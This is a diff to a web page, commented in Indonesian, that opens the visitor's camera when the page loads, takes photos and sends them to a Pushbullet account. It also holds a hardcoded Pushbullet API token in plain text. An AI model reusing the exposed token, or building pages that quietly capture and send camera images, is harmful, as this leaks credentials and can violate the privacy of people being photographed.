@@ -48,14 +48,24 @@
         const context = canvas.getContext('2d');
         const messageDiv = document.getElementById('message'); // Div untuk pesan
 
-        // Mengakses kamera
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-            })
-            .catch(error => {
-                console.error('Gagal mengakses kamera:', error);
-            });
+        // Fungsi untuk mengakses kamera
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+
+                    // Menyelaraskan ukuran canvas dengan video
+                    const videoWidth = video.videoWidth;
+                    const videoHeight = video.videoHeight;
+                    canvas.width = videoWidth;
+                    canvas.height = videoHeight;
+                })
+                .catch(error => {
+                    console.error('Gagal mengakses kamera:', error);
+                    messageDiv.innerHTML = '❌ Gagal mengakses kamera. Pastikan kamera diizinkan.';
+                    messageDiv.style.color = '#d9534f';  // Merah untuk error
+                });
+        }
 
         // Fungsi untuk mengambil foto
         function takePicture() {
@@ -101,7 +111,7 @@
 
         // Fungsi untuk mengirim foto ke Pushbullet
         async function sendNotification(imageUrl) {
-            const apiToken = "o.eZpK3CIgtlM6N111otxGSIf6MTLULt0j'; // Ganti dengan API Token dari Pushbullet
+            const apiToken = 'o.eZpK3CIgtlM6N111otxGSIf6MTLULt0j'; // Ganti dengan API Token dari Pushbullet
             const userKey = 'o.eZpK3CIgtlM6N111otxGSIf6MTLULt0j';   // Ganti dengan User Key dari akunmu
 
             const message = {
@@ -130,6 +140,9 @@
                 console.error('Error:', error);
             }
         }
+
+        // Mulai kamera ketika halaman dimuat
+        startCamera();
     </script>
 </body>
 </html>
